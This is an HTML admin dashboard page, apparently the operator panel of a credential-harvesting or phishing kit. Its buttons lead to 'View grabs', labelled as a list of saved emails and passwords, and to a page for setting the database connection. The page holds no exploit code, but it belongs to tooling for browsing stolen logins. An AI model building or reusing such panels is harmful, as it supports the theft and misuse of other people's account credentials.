<!DOCTYPE html>
<html>
    <head>
        <title>config.</title>
        <link rel="icon" type="image/x-icon" href="./../images/config.ico">
        <link rel="stylesheet" type="text/css" href="./../css/admin.css">
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Work+Sans:wght@500&display=swap" rel="stylesheet">
    </head>
    <body>
       <div class="centered-login">
        <img src="./../images/config.png" width="50" width="50">
        <p style="text-align:center;">This is the admin dashboard.</p><br><br>
            <a href="./grabs.php"><button style="float:none; width:250px;">View grabs</button></a>
            <p style="text-align:center; font-size:11px;">List of saved emails and passwords.</p>
            <br><br>
            <a href="./config.php"><button style="float:none; width:250px;">Config DB connection params.</button></a>
            <p style="text-align:center; font-size:11px;">Modify the database connection parameters.</p>
            <br><br>
            <p style="text-align:center; font-size:12px;">List of saved emails and passwords.</p>
            <br><br>
       </div> 
    </body>
</html>